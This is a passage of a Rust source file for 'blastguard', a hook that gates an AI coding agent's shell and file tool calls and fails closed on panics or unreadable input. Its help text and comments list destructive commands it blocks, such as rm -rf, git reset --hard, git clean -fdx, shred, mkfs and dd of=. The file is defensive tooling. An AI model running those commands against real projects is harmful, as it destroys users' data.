// テスト内の unwrap/expect は意図的な assert であって fail-open ではないので許可する。
// production 側は workspace の [workspace.lints.clippy] で deny のまま。
#![cfg_attr(test, allow(clippy::unwrap_used, clippy::expect_used))]
//! blastguard — a Claude Code PreToolUse hook that denies project-destroying
//! Bash commands and file operations.
//!
//! Contract: we read the tool call from stdin, decide allow/deny/ask with a
//! pure function, and — on anything but an allow — print the single-line
//! PreToolUse JSON and exit 0. blastguard is a GATE: it has a verdict, so the
//! repo-wide "a hook must never break the turn" rule does not apply to it
//! (CLAUDE.md §1). A block is not a broken turn, and "could not decide" is
//! resolved to the blocking side, never to silence.
//!
//! A silent exit 0 with no output IS an allow. So the previous contract ("on
//! any panic we stay silent and exit 0") meant that a panic anywhere in the
//! analyser silently ALLOWED the very command it had failed to analyse.
//! `#![deny(clippy::panic)]` does not prevent that: it stops explicit `panic!`
//! only, not index-out-of-bounds, non-char-boundary string slicing, arithmetic
//! overflow or unwrap-on-None. So the analysis now runs inside
//! `std::panic::catch_unwind` and a caught panic becomes a DENY, which is a
//! normal outcome.
//!
//! That barrier covers `analyse` only. Everything else on the verdict path —
//! reading stdin, parsing, the approval-memory lookup, printing the decision —
//! used to run under `harness_core::hook::run_hook`, whose barrier logs the
//! panic and exits 0: an allow (backlog 70883137). Measured: with stdout
//! closed, `println!` of a DENY panicked with EPIPE and the process exited 0.
//! The verdict path now runs under [`run_verdict_guarded`], where a panic
//! anywhere exits 2 — the PreToolUse blocking exit — with the panic message on
//! stderr. Exit 2 is used rather than a JSON deny because the panic may be IN
//! the stdout write; the exit code is the one channel that still works.
//!
//! # What is still a silent allow, and what stopped being one
//!
//! This paragraph used to read "Empty/invalid input and an unmatched tool are
//! still a silent allow — those are cases where we successfully determined
//! there is nothing to judge, not cases where we failed to determine
//! anything." Two of those three were, the middle one was NOT, and the
//! sentence's own criterion is what convicts it:
//!
//!   * EMPTY stdin — nothing to judge. Determined. Silence is accurate.
//!   * an UNMATCHED TOOL (`Read`, `Grep`, …) — outside blastguard's
//!     jurisdiction. Determined. Silence is accurate, and folding it in would
//!     make the hook prompt on every file read.
//!   * INVALID input — a tool call IS being made and blastguard could not read
//!     it. That is the definition of failing to determine, filed under
//!     "successfully determined there is nothing to judge". It allowed
//!     precisely the call it had failed to read.
//!
//! So an unreadable payload now emits `Ask` (hardened to `Deny` where no human
//! can answer) rather than exiting silently, and the same applies one level in:
//! a MATCHED tool whose operand is missing or not a string is a refusal, not an
//! allow. See `detect::unreadable_operand`.
//!
//! The docstring outlived the behaviour it described by describing the
//! behaviour someone intended. CLAUDE.md 4 calls that a trap for the next
//! reviewer, and it worked as one: the analysis side of this crate had applied
//! the three-answer rule to 25-odd sub-analysers while its own front door
//! returned two, and this paragraph is why that read as deliberate.

use blastguard::model::Decision;
use blastguard::rule_id::INTERNAL_ERROR_REASON;
use blastguard::scope::SafeRoots;
use blastguard::{approve, detect, hookio, interactive, log, relay, retro, rule_id};
use harness_core::hook::{self, HookInput};
use std::process::exit;

fn main() {
    // Minimal CLI surface: version/help/protects/retro short-circuit before touching stdin.
    let args: Vec<String> = std::env::args().skip(1).collect();
    for (i, arg) in args.iter().enumerate() {
        match arg.as_str() {
            "--version" | "-V" => {
                println!("blastguard {}", env!("CARGO_PKG_VERSION"));
                exit(0);
            }
            "--help" | "-h" => {
                print_help();
                exit(0);
            }
            "--protects" => {
                // The protection statement (backlog 3a8e3b73), readable
                // without triggering the gate. A pure print: no verdict.
                let p = blastguard::protection::PROTECTION;
                println!("PROTECTS: {}", p.protects);
                println!("AGAINST: {}", p.against);
                println!("GROUNDS: {}", p.grounds);
                exit(0);
            }
            "retro" => {
                exit(run_retro(&args[i + 1..]));
            }
            "log" => {
                exit(log::run_log(&args[i + 1..]));
            }
            "record-approval" => {
                // PostToolUse. This path has NO verdict: it prints nothing and
                // decides nothing, so `run_hook`'s panic-to-exit-0 barrier is
                // not a fail-open here — losing a recording means the next run
                // asks again, which is the restrictive side.
                // `run_hook` never returns — it exits 0 itself.
                hook::run_hook(record_approval);
            }
            "relay" => {
                // The subagent Ask relay (see `blastguard::relay`). Its Stop
                // subcommand has a verdict and runs under the fail-closed
                // Stop barrier; the PostToolUse markers have none.
                exit(run_relay(&args[i + 1..]));
            }
            _ => {}
        }
    }
    // The verdict path. Panics inside the ANALYSIS are caught by `analyse`
    // and turned into a deny; a panic anywhere else on this path (stdin read,
    // parse, approval memory, the decision print) is caught here and BLOCKS
    // (exit 2). See `run_verdict_guarded`.
    run_verdict_guarded(run);
}

/// Run the PreToolUse verdict path under a FAIL-CLOSED panic barrier.
///
/// `harness_core::gate::run::run_guarded` is the Stop-hook form of this and
/// does not fit here: it answers a panic with a `{"decision":"block"}` line on
/// stdout, which is the Stop protocol (PreToolUse reads
/// `hookSpecificOutput.permissionDecision`), and it bounds the block with
/// `stop_hook_active`, which a PreToolUse payload does not carry. More
/// basically, stdout can be the thing that panicked (EPIPE on the decision
/// print), so no stdout-based answer is reliable. PreToolUse's exit code 2 is:
/// Claude Code blocks the tool call and shows stderr to the model.
///
/// No bounded-allow counterpart is needed: a blocked tool call does not trap
/// the session the way a blocked Stop does — the model sees the error and can
/// do something else.
fn run_verdict_guarded<F: FnOnce()>(body: F) -> ! {
    let outcome = std::panic::catch_unwind(std::panic::AssertUnwindSafe(body));
    exit(verdict_exit_code(outcome))
}

/// Pure core of [`run_verdict_guarded`]: 0 when the verdict path completed
/// (its decision, if any, is already on stdout), 2 when it panicked. The panic
/// message goes to stderr; the default panic hook has printed it too, but this
/// line names the consequence. A failed stderr write is ignored because the
/// exit code, not the message, carries the block.
fn verdict_exit_code(outcome: std::thread::Result<()>) -> i32 {
    match outcome {
        Ok(()) => 0,
        Err(payload) => {
            let msg = if let Some(s) = payload.downcast_ref::<&str>() {
                (*s).to_string()
            } else if let Some(s) = payload.downcast_ref::<String>() {
                s.clone()
            } else {
                "(non-string panic payload)".to_string()
            };
            use std::io::Write as _;
            let _ = writeln!(
                std::io::stderr(),
                "blastguard: internal error (panic) on the verdict path: {msg} — the tool \
                 call was not judged, so it is BLOCKED (exit 2), not allowed"
            );
            2
        }
    }
}

/// Parsed form of `blastguard retro`'s CLI arguments.
///
/// Split out of `run_retro` as a pure function (`Result` instead of
/// `eprintln!` + `return 2`, no printing, no filesystem access) specifically
/// so the flag-parsing logic — most notably "`--rule-id` alone implies
/// `--list`" — is reachable from a unit test. `run_retro` was previously the
/// only caller of this logic, and `main.rs` had no test module at all: that
/// rule shipped with zero coverage, and a regression to the old "print the
/// unfiltered table" behaviour would have kept the suite green.
#[derive(Debug, Clone, PartialEq, Eq, Default)]
struct RetroArgs {
    /// Last `--dir <path>` or resolved `--project <path>` seen, in the order
    /// the flags were given (matches the original mutable-variable behaviour:
    /// whichever of `--dir`/`--project` appears LAST wins).
    dir: Option<std::path::PathBuf>,
    /// Listing mode — already folded together with the `--rule-id`-implies-
    /// `--list` rule below, so callers never need to re-derive it.
    list: bool,
    rule_filter: Option<String>,
}

fn parse_retro_args(rest: &[String]) -> Result<RetroArgs, String> {
    let mut dir: Option<std::path::PathBuf> = None;
    let mut list = false;
    let mut rule_filter: Option<String> = None;
    let mut it = rest.iter();
    while let Some(a) = it.next() {
        match a.as_str() {
            "--dir" => match it.next() {
                Some(v) => dir = Some(std::path::PathBuf::from(v)),
                None => return Err("blastguard retro: --dir needs a path".to_string()),
            },
            "--project" => match it.next() {
                Some(v) => dir = retro::transcript_dir_for(std::path::Path::new(v)),
                None => return Err("blastguard retro: --project needs a path".to_string()),
            },
            "--list" => list = true,
            "--rule-id" => match it.next() {
                Some(v) => rule_filter = Some(v.clone()),
                None => return Err("blastguard retro: --rule-id needs a rule id".to_string()),
            },
            other => return Err(format!("blastguard retro: unknown argument `{other}`")),
        }
    }
    // `--rule-id` only means something in listing mode. Accepting it alone and
    // silently printing the UNFILTERED table would hand the reviewer a report
    // that reads as narrowed to one rule when it is not — the same class of
    // defect as a blank command field reading as "no command".
    let list = list || rule_filter.is_some();
    Ok(RetroArgs {
        dir,
        list,
        rule_filter,
    })
}

/// `blastguard retro` — review past gate interventions and what became of them.
///
/// `--list` switches from the per-rule count table to one row per
/// intervention (gate, rule id, outcome, raw reason, recorded command); pair
/// it with `--rule-id <id>` to narrow the listing to a single rule, e.g. to
/// compare which specific interventions a fix made a rule stop raising
/// (see [`blastguard::retro::render_list`]). `--rule-id` alone (no explicit
/// `--list`) also switches to listing mode — see [`parse_retro_args`].
///
/// # Exit status is a verdict, not a formality
///
/// `2` when the corpus could not be read. A reviewer scripting this must be
/// able to tell "no gate ever stopped anything" from "I read nothing", and an
/// exit 0 printing an empty table conflates them — the same fail-open the
/// report body refuses (see [`blastguard::retro`]).
fn run_retro(rest: &[String]) -> i32 {
    let args = match parse_retro_args(rest) {
        Ok(a) => a,
        Err(msg) => {
            eprintln!("{msg}");
            return 2;
        }
    };
    let dir = match args.dir.or_else(|| {
        std::env::current_dir()
            .ok()
            .and_then(|c| retro::transcript_dir_for(&c))
    }) {
        Some(d) => d,
        None => {
            eprintln!(
                "blastguard retro: could not locate a transcript directory — pass --dir explicitly"
            );
            return 2;
        }
    };
    let report = retro::build_report(retro::scan_dir(&dir));
    let out = if args.list {
        retro::render_list(&report, args.rule_filter.as_deref())
    } else {
        retro::render(&report)
    };
    print!("{out}");
    if report.is_undetermined() {
        eprintln!("(looked in {})", dir.display());
        return 2;
    }
    0
}

fn print_help() {
    println!(
        "blastguard {ver}\n\
A Claude Code PreToolUse hook that denies project-destroying operations.\n\n\
USAGE:\n  blastguard                  read a PreToolUse payload from stdin (normal mode)\n  blastguard record-approval  read a PostToolUse payload from stdin and record\n                              that this exact effect was approved\n  blastguard log [OPTIONS]    list decision/command history from violation ledger\n  blastguard relay mark-executed | mark-relayed | stop\n                              subagent Ask relay hooks (PostToolUse / Stop)\n  blastguard relay dismiss <id> --reason <text>\n                              record why a relayed subagent Ask is not re-run\n  blastguard --protects       print what this gate protects, from what, and why\n  blastguard --version        print version\n  blastguard --help           this help\n\n\
blastguard log lists blastguard lines from overwatch's violations.jsonl ledger:\n  blastguard log                           list all entries in file order\n  blastguard log --decision deny|ask       filter by decision (default: all)\n  blastguard log --rule <id>               filter by rule ID (default: all)\n  blastguard log --since <RFC3339|Ns|Nm|Nh|Nd>  filter by timestamp (RFC3339 only in UTC 'Z' form)\n  blastguard log --system-harm             show only system-harm lines\n  blastguard log --subagent                show only subagent lines\n  blastguard log --interactive             show only interactive lines\n  blastguard log --json                    output JSON instead of text\n\nExit codes: 0=success, 2=usage error, 3=ledger path-resolution failure, ledger\nunreadable, unparsable ledger line, or stdout write failure.\nText format prints: decision= actor= system_harm= rule= tool= cwd= then command=\n(Bash) or target= (file tools); values are escaped (\\n \\r \\t, \\xHH, \\\\) so one\nentry is one line. Absent fields print as 'unknown' (text) or null (JSON).\n\n\
It denies recursive/wildcard rm, git reset --hard, git clean -fdx, truncate,\n\
shred, mkfs, dd of=, recursive chmod/chown, find -delete, and single-> file\n\
overwrites — while exempting repo CONFIG files (.claude/** config, *.toml,\n\
*.lock, …). A worktree checked out under .claude/worktrees/ is source, not\n\
config, and is judged by the path it would have outside that directory.",
        ver = env!("CARGO_PKG_VERSION")
    );
}

fn run() {
    let raw = hook::read_stdin();

    // EMPTY stdin is the case that genuinely determined there is nothing to
    // judge: no tool call was described, so silence is an accurate answer.
    if raw.trim().is_empty() {
        return;
    }

    // Read from the RAW bytes, not from `HookInput`: the shared struct has no
    // `agent_id` field, and a payload `HookInput::parse` rejects must still be
    // classified (see `payload_is_subagent` for the fail-closed rules).
    let subagent = interactive::payload_is_subagent(&raw);
    let agent_id = payload_agent_id(&raw);

    let input = match HookInput::parse(&raw) {
        Some(i) => i,
        None => {
            // NON-EMPTY and unparseable is the opposite situation: a tool call
            // is being made and blastguard could not read it. Silence here IS
            // an allow (see the module docstring), so it would allow precisely
            // the call it failed to read. `HookInput::parse` erases the reason
            // via `.ok()`, so the two cases are indistinguishable downstream —
            // which is why they are separated HERE, at the only point that
            // still has the raw bytes.
            emit(
                Decision::ask(UNREADABLE_PAYLOAD),
                None,
                subagent,
                agent_id.as_deref(),
            );
            return;
        }
    };

    let decision = analyse(&input);
    let decision = consult_memory(&input, decision);

    emit(decision, Some(&input), subagent, agent_id.as_deref());
}

/// The payload's `agent_id` as a string, for the relay record only. Subagent
/// DETECTION stays with [`interactive::payload_is_subagent`]; this never
/// decides anything.
fn payload_agent_id(raw: &str) -> Option<String> {
    serde_json::from_str::<serde_json::Value>(raw.trim())
        .ok()?
        .get("agent_id")?
        .as_str()
        .map(str::to_string)
}

/// Queue a subagent's hardened Ask for the main session and return the line
/// appended to the printed deny reason (user ruling 2026-11-14:
/// 「sub agentのAskはmainで裁定する」; see [`blastguard::relay`]).
///
/// `None` — nothing queued, nothing appended — when the main session could not
/// ask either ([`interactive::ask_available`] is false: there is no human to
/// adjudicate it, and the main thread's own Asks are hardened to Deny there
/// too), or when the call is not a parsed Bash command (only a command string
/// can be re-run verbatim).
///
/// This runs AFTER the verdict is decided and cannot change it: every outcome,
/// including a panic in the queue write, is an annotation. A failed write is
/// annotated rather than dropped, because a silently lost record would read
/// as "nothing to relay".
fn relay_annotation(
    ask_reason: &str,
    input: Option<&HookInput>,
    agent_id: Option<&str>,
) -> Option<String> {
    if !interactive::ask_available() {
        return None;
    }
    let input = input?;
    let command = bash_command(input)?;
    let session = relay::session_of(&input.session_id);
    let cwd = input.cwd.clone();
    let dir = relay::relay_dir();
    let agent = agent_id.map(str::to_string);
    let reason = ask_reason.to_string();
    let queued = std::panic::catch_unwind(move || {
        relay::queue(&dir, &session, agent.as_deref(), &cwd, &command, &reason)
    });
    Some(match queued {
        Ok(Ok(id)) => format!(
            "\n\nblastguard relay: queued for the main session as relay id {id} (user ruling \
             「sub agentのAskはmainで裁定する」). Put the relay id, the cwd and the exact command \
             in your report. The main session re-runs it under its own permission prompt and \
             sends you the result."
        ),
        Ok(Err(why)) => format!(
            "\n\nblastguard relay: WARNING this Ask could NOT be queued for the main session \
             ({why}). Report the exact command and cwd to your parent agent yourself; the main \
             session's Stop gate does not know about it."
        ),
        Err(_) => "\n\nblastguard relay: WARNING this Ask could NOT be queued for the main \
                   session (internal error while writing the relay queue). Report the exact \
                   command and cwd to your parent agent yourself; the main session's Stop gate \
                   does not know about it."
            .to_string(),
    })
}

/// Turn an `Ask` into a `Deny` for a call made inside a subagent.
///
/// Nobody can answer a permission prompt there (a background subagent waited
/// 10.6 h on one), so the agent gets a refusal it can act on: report and stop.
/// The original reason is kept verbatim so the parent sees what was refused.
/// `Deny` and `Allow` pass through untouched.
fn harden_for_subagent(decision: Decision) -> Decision {
    match decision {
        Decision::Ask(reason) => Decision::Deny(format!(
            "blastguard: this call was made inside a subagent, where nobody can \
             answer a permission prompt, so it is denied instead of asked. Do not \
             retry it another way. Stop and report the reason below verbatim to \
             your parent agent so a human can decide.\n\n{reason}"
        )),
        other => other,
    }
}

/// The reason attached to a payload blastguard could not parse at all.
///
/// A `const` rather than an inline literal so `rule_id` classifies it from the
/// same string the emitter uses — the drift between those two would be silent,
/// filing every schema break under `"unknown"`.
const UNREADABLE_PAYLOAD: &str =
    "blastguard could not parse this hook payload, so the tool call was never \
analysed — refusing to guess. If this recurs, the hook's payload schema has \
drifted from what Claude Code sends and needs updating.";

/// Harden, print, and only then record telemetry.
///
/// # The order is the invariant
///
/// `record_violation` used to run BEFORE the `println!`. Its own comment
/// promised the telemetry "must never change the decision, the printed JSON, or
/// the exit code" — but `let _ =` only neutralises the store write RETURNING an
/// error, not any of the event-construction steps PANICKING. A panic there
/// unwound past this function into `hook::run_hook`, which logged and exited 0
/// with nothing on stdout, and a silent exit 0 IS an allow. (The outer barrier
/// is now [`run_verdict_guarded`], which blocks on a panic; printing first is
/// still what keeps telemetry from overriding the verdict it observes.) So a crash in
/// purely additive telemetry could suppress a deny it was merely observing.
///
/// I could not find a panic reachable in that path today — `rule_id` is
/// `contains` comparisons on `&str`, `store::now` is `unwrap_or(0)`,
/// `cwd_or_current` is `unwrap_or_else`, and neither `build_event` nor
/// `normalize_signature` slices or unwraps. So this is a LATENT fail-open, not
/// a live one, and it is recorded as such rather than dressed up as an
/// exploitable bug. It is still worth closing: the decision should not be
/// hostage to work that has no say in it, and the next line added to that path
/// should not be able to re-open the hole silently. Printing first makes the
/// ordering enforce that, and the inner `catch_and_log` means telemetry can
/// only ever lose ITSELF.
fn emit(decision: Decision, input: Option<&HookInput>, subagent: bool, agent_id: Option<&str>) {
    // A subagent can never answer an `ask` — user ruling 2026-11-01, after a
    // background subagent waited 10.6 h on one. Its env is inherited from the
    // main thread and looks interactive, so this check comes FIRST and is not
    // overridable by `BLASTGUARD_ASK=always`.
    if subagent {
        // The relay record (user ruling 2026-11-14, 「sub agentのAskはmainで
        // 裁定する」) is taken for an `Ask` only — a `Deny`, system harm
        // included, is never queued. It annotates the printed reason; the
        // verdict is `harden_for_subagent`'s, unchanged.
        let annotation = match &decision {
            Decision::Ask(reason) => relay_annotation(reason, input, agent_id),
            _ => None,
        };
        // The repeat-deny downgrade is skipped on purpose: inside a subagent
        // its `Ask` would stall exactly like any other. A repeat stays a deny.
        emit_line_annotated(
            harden_for_subagent(decision),
            input,
            "subagent",
            annotation.as_deref(),
        );
        return;
    }

    // An `Ask` is only a real question when someone can answer it. In a headless
    // or agent-driven session it is not a pause, it is a block the agent cannot
    // clear — so it is hardened to a deny instead. Never to an allow: "ask に
    // できないときは fail".
    let interactive_session = interactive::ask_available();
    let decision = if interactive_session {
        decision
    } else {
        decision.hardened()
    };
    let actor = if interactive_session {
        "interactive"
    } else {
        "headless"
    };

    // Operator ruling 2026-09-18 —「ユーザの指示を2度やぶるgateはいらない。
    // 2度目はaskせよ」. Deliberately placed AFTER `hardened()`, not before: the
    // operator was asked whether headless/agent runs should be exempt and ruled
    // 「全 gate で 2度目は無条件に通す」, so the downgrade has to survive the
    // hardening that would otherwise fold it straight back into a deny.
    // Subagents are the one exception (user ruling 2026-11-01, handled above).
    let decision = downgrade_on_repeat(input, decision);

    emit_line(decision, input, actor);
}

/// Print the decision, then record telemetry (see [`emit`] for why the order
/// is the invariant).
fn emit_line(decision: Decision, input: Option<&HookInput>, actor: &str) {
    emit_line_annotated(decision, input, actor, None);
}

/// [`emit_line`] with `annotation` appended to the PRINTED reason only. The
/// violation ledger records the unannotated reason, so its rule id
/// (`rule_id::rule_id`, a `contains` classifier) cannot be moved by the
/// annotation's wording. An `Allow` is never annotated (it prints nothing).
fn emit_line_annotated(
    decision: Decision,
    input: Option<&HookInput>,
    actor: &str,
    annotation: Option<&str>,
) {
    let printed = match (&decision, annotation) {
        (Decision::Deny(r), Some(a)) => Decision::Deny(format!("{r}{a}")),
        (Decision::Ask(r), Some(a)) => Decision::Ask(format!("{r}{a}")),
        _ => decision.clone(),
    };
    let Some(line) = hookio::decision_line(&printed) else {
        return; // Allow → print nothing.
    };

    // The decision reaches Claude Code FIRST. Nothing below can retract it.
    println!("{line}");

    // Fail-soft fleet violation record for overwatch's cross-task
    // correlated-error detection. Asks are recorded too — a recurring ask is
    // the signal that some real construct is going unanalysed.
    //
    // A payload we could not parse has no `HookInput` to attribute to, so it is
    // simply not recorded; inventing a task key for it would pollute the
    // recurrence signature with a synthetic one.
    if let (Some(input), Decision::Deny(reason) | Decision::Ask(reason)) = (input, &decision) {
        let kind = if decision.is_deny() { "deny" } else { "ask" };
        let system_harm = decision.is_system_harm();
        let _ = hook::catch_and_log("blastguard-violation-record", || {
            record_violation(input, reason, kind, actor, system_harm)
        });
    }
}

/// Hand the decision back to the human when this gate has already refused this
/// exact effect in this session.
///
/// # The ruling
///
/// 「ユーザの指示を2度やぶるgateはいらない。2度目はaskせよ」 (operator,
/// 2026-09-18). A first `Deny` tells the user something they had not weighed. A
/// second `Deny` for the same effect, after they have read the reason and asked
/// again, adds nothing — it just substitutes the gate's judgement for theirs.
/// So the repeat becomes an `Ask`: still not an automatic yes, but a question
/// the human can answer instead of a refusal they cannot clear.
///
/// # What this may and may not do
///
/// `Deny` is the only variant it touches. `Ask` and `Allow` return untouched,
/// so this can never make a verdict *stricter*, and it can never manufacture an
/// `Allow` — the strongest thing it produces is a question. The escalation
/// `Ask` → `Deny` has no path through here at all.
///
/// # System harm is never downgraded (user ruling 2026-11-07)
///
/// 「いかなる理由であれシステムに害になるコマンドはdenyすべし」/「1は絶対にdenyで
/// いい」: a `Deny` whose reason carries [`blastguard::model::SYSTEM_HARM_MARK`]
/// ([`Decision::is_system_harm`]) is returned unchanged on every repeat. Every
/// other `Deny` keeps the downgrade above.
///
/// # Fail-closed (CLAUDE.md §3)
///
/// [`harness_core::repeat::must_yield`] answers `false` for both "first time"
/// and "could not tell" — an unset session id, an unwritable ledger, an IO
/// error. A ledger that cannot answer therefore leaves the `Deny` exactly as it
/// was; "I did not check" never reads as "the user already saw this".
fn downgrade_on_repeat(input: Option<&HookInput>, decision: Decision) -> Decision {
    let Decision::Deny(reason) = &decision else {
        return decision;
    };
    // User ruling 2026-11-07 (「1は絶対にdenyでいい」): a command that harms the
    // system stays Deny on every request. See `model::SYSTEM_HARM_MARK`.
    if decision.is_system_harm() {
        return decision;
    }
    let Some(input) = input else {
        // No parsed payload means no effect to identify, and an unidentifiable
        // effect cannot be shown to be a repeat of anything.
        return decision;
    };
    let fingerprint = repeat_fingerprint(input, reason);
    if !harness_core::repeat::must_yield("blastguard", &fingerprint) {
        return decision;
    }
    Decision::Ask(format!(
        "{reason}\n\n(2度目の同一要求です。blastguard は同じ指示を2度は上書きしません — \
         この判断は人間に返されました。)"
    ))
}

/// The identity of "the same refusal again".
///
/// Built from the tool, its primary target and the deny reason rather than the
/// whole `tool_input`: a `Write` carries its file *content*, and keying on that
/// would make every retyped byte a brand-new finding, so the second attempt at
/// the same file would never register as a repeat. Including the reason keeps
/// two different rules firing on one path distinguishable — clearing one must
/// not silently clear the other.
fn repeat_fingerprint(input: &HookInput, reason: &str) -> String {
    let target = bash_command(input)
        .or_else(|| {
            input
                .tool_input
                .as_ref()
                .and_then(|t| t.get("file_path"))
                .and_then(|v| v.as_str())
                .map(str::to_string)
        })
        .unwrap_or_default();
    format!("{}\u{1}{}\u{1}{}", input.tool_name, target, reason)
}

/// Run the detector with a panic barrier.
///
/// A panic here used to be swallowed into a silent exit 0, and a silent exit 0
/// IS an allow — so any crash in the analyser allowed the command it had just
/// failed to analyse. Catching it and returning a deny turns the crash into an
/// ordinary, attributable verdict (a deny with the internal-error reason)
/// instead of a fail-open.
///
/// `catch_unwind` is sound here because the closure borrows only `input` and the
/// detector holds no cross-call mutable state that a half-finished analysis
/// could leave inconsistent — the per-command analysis budget is re-seeded at
/// entry to `detect`, not carried between calls.
fn analyse(input: &HookInput) -> Decision {
    let tool = input.tool_name.clone();
    let tool_input = input.tool_input.clone();
    // Built OUTSIDE the barrier deliberately: it touches the filesystem
    // (`canonicalize`) and the environment, and neither belongs inside the
    // catch_unwind whose job is to convert an ANALYSIS crash into a deny.
    // `safe_roots` itself cannot panic — every fallible step is an
    // `Option`/`Result` resolved to the restrictive side — and if it somehow
    // did, `run_verdict_guarded`'s outer barrier blocks the call (exit 2).
    let scope = safe_roots(input);
    let result =
        std::panic::catch_unwind(move || detect::detect_scoped(&tool, tool_input.as_ref(), &scope));
    match result {
        Ok(decision) => decision,
        Err(_) => Decision::deny(INTERNAL_ERROR_REASON),
    }
}

/// The session's location model: which trees this session may destroy things
/// INSIDE without a flat refusal.
///
/// Only the binary can build this — it is the only part of the crate that may
/// read the environment or the filesystem. Everything it passes is a fact about
/// the session, never about the command being judged:
///
///   * the PreToolUse payload's `cwd` — where the session is working (a git
///     worktree, typically);
///   * `CLAUDE_PROJECT_DIR` — the project root Claude Code exports to every
///     hook, which differs from `cwd` in a worktree session and is equally
///     legitimate;
///   * `HOME` — never a root itself: [`SafeRoots::new`] REFUSES to treat the
///     home directory as one, and derives from it only the worktree storage
///     root `$HOME/.condukt/worktrees`. Recursive rm strictly inside a
///     worktree storage root is Allow (user ruling, backlog 873651b9) only
///     when the root currently exists as a real directory with no symlink
///     below its anchor, the whole command is bare `rm`/`cd` segments, no
///     word of any `rm` segment has a `..` component (`scope` collapses `..`
///     lexically before resolving symlinks, so `lnk/../x` would be judged
///     where the kernel does not delete), the RAW `cwd` below (and the raw
///     `CLAUDE_PROJECT_DIR`, when absolute) has no `..` / `.` component and
///     the cwd is absolute — checked by [`SafeRoots::new`] on the value passed
///     here, before it normalises anything — and — if any `cd` is present —
///     every `rm` operand is absolute (a `cd` may fail or run in a subshell,
///     so a relative operand after it is not judged against the runtime cwd).
///     This is not a claim that bare `rm`/`cd`
///     is safe in general; see `scope`'s module doc ("What actually stops
///     each escape") for which check closes which case and what stays open;
///   * `TMPDIR` — added to the fixed temp roots. Note the asymmetry that makes
///     this sound: reading `$TMPDIR` out of the hook's own environment is not
///     the same act as expanding the literal string `$TMPDIR` found in a
///     command, which `scope` always refuses to do.
///
/// The same inputs also give the deletion principle (backlog 3aa215e1,
/// `blastguard::deletion`) its temp roots (`/tmp`, `/private/tmp`, `TMPDIR`)
/// and cache roots (`$HOME/.cache`, `$HOME/Library/Caches`) — each only when it
/// is a real, non-symlinked directory right now — and this function attaches
/// the git work-tree probe (`reversible::probe_tree`) that its project classes
/// need, plus the absent-path index probe (`reversible::probe_absent_path`)
/// the `git checkout -- <pathspec>` verdict uses for a path missing on disk.
/// Recursive rm strictly inside them is Allow under the same
/// whole-command conditions as the worktree Allow plus a few more (no `.`
/// component, plain options-then-operands); see `deletion`'s module doc.
///
/// A missing or empty `cwd` yields a model with only the temp roots in it, and
/// an unresolvable one yields no model at all — both of which simply keep the
/// pre-0.2.51 verdicts.
fn safe_roots(input: &HookInput) -> SafeRoots {
    let cwd = input.cwd.trim();
    let project = std::env::var("CLAUDE_PROJECT_DIR").ok();
    let home = std::env::var("HOME").ok();
    let tmpdir = std::env::var("TMPDIR").ok();
    SafeRoots::new(
        if cwd.is_empty() { None } else { Some(cwd) },
        project.as_deref(),
        home.as_deref(),
        tmpdir.as_deref(),
        Some(real_path),
    )
    .with_git_tree_probe(blastguard::reversible::probe_tree)
    .with_git_absent_probe(blastguard::reversible::probe_absent_path)
    .with_git_restore_probe(blastguard::reversible::probe_restore_content)
}

/// Resolve `path` to its real path — symlinked components included — WITHOUT
/// requiring that `path` itself exists.
///
/// `std::fs::canonicalize` fails outright on a missing path, and a destructive
/// target that does not exist is completely ordinary (`rm -rf target` in a
/// freshly cloned tree). So this canonicalises the deepest EXISTING ancestor and
/// re-attaches the components below it: the symlink question is answered for
/// every component that exists, which is every component that could redirect
/// the operation somewhere else.
///
/// `None` on failure, which `scope` reads as `Undetermined` — i.e. the caller
/// keeps its Deny. Notable consequences, both on the restrictive side:
///
///   * a FINAL component that is itself a symlink is resolved to its target, so
///     `rm -rf link-to-usr` is judged at `/usr` even though deleting a symlink
///     does not touch what it points at. That over-denies (`rm` of a symlink
///     inside the project reads as leaving the tree), which is exactly the
///     direction this crate errs in, and is no worse than the flat Deny that
///     shape had before;
///   * a path whose every ancestor is unreadable resolves to nothing and stays
///     refused.
fn real_path(path: &str) -> Option<String> {
    let mut cur = std::path::PathBuf::from(path);
    let mut tail: Vec<std::ffi::OsString> = Vec::new();
    // Each iteration pops exactly one component, so this terminates at `/`.
    loop {
        if let Ok(real) = cur.canonicalize() {
            let mut out = real;
            for name in tail.iter().rev() {
                out.push(name);
            }
            return out.to_str().map(str::to_string);
        }
        let name = cur.file_name()?.to_os_string();
        if !cur.pop() {
            return None;
        }
        tail.push(name);
    }
}

/// Append a `ViolationEvent` for this denial to overwatch's project-scoped
/// violations.jsonl. A failed append does not change the verdict, but it is
/// reported on stderr rather than dropped. `reason` is free text (may embed a
/// variable path/target) — `rule_id::rule_id` normalizes it to a stable
/// discriminator before it becomes the violation signature.
fn record_violation(input: &HookInput, reason: &str, kind: &str, actor: &str, system_harm: bool) {
    let target = input.target();
    let task_key = match &target {
        Some(t) => format!("{}:{}", input.tool_name, t),
        None => input.tool_name.clone(),
    };
    let raw = overwatch::violation::RawViolation {
        rule_id: Some(rule_id::rule_id(reason)),
        ..Default::default()
    };
    let command = if input.tool_name == "Bash" {
        input
            .tool_input
            .as_ref()
            .and_then(|ti| ti.get("command"))
            .and_then(|c| c.as_str())
            .map(str::to_string)
    } else {
        None
    };
    let event = overwatch::violation::build_event(
        overwatch::violation::ViolationSource::Blastguard,
        &raw,
        task_key,
        input.session_key(),
        overwatch::store::now(),
        Some(reason.to_string()),
    );
    let cwd = input.cwd_or_current();
    match event {
        Some(mut event) => {
            event.decision = Some(kind.to_string());
            event.tool = Some(input.tool_name.clone());
            event.command = command;
            event.target = input.target();
            event.cwd = Some(input.cwd.clone());
            event.actor = Some(actor.to_string());
            event.system_harm = Some(system_harm);
            // The verdict itself is unaffected, but a lost record must not be
            // silent: overwatch reads this ledger as "what blastguard denied"
            // (backlog f738a79a).
            if let Err(e) = overwatch::store::append_violation(&cwd, &event) {
                eprintln!(
                    "blastguard: WARNING could not record the `{}` violation in the overwatch \
                     violation ledger: {e}. This denial is NOT represented there.",
                    event.signature
                );
            }
        }
        None => eprintln!(
            "blastguard: WARNING this denial produced no violation event (blank rule id), \
             so it is NOT recorded in the overwatch violation ledger."
        ),
    }
}

/// Where the approval memory lives.
///
/// `BLASTGUARD_APPROVALS_DIR` overrides it. That override is not a convenience:
/// the anti-vacuity control in `tests/approval_memory.rs` that proves the store
/// is actually being consulted works by pointing a second run at a DIFFERENT
/// store and requiring the ask to come back, which is unwritable without it.
fn memo_dir() -> std::path::PathBuf {
    if let Ok(dir) = std::env::var("BLASTGUARD_APPROVALS_DIR") {
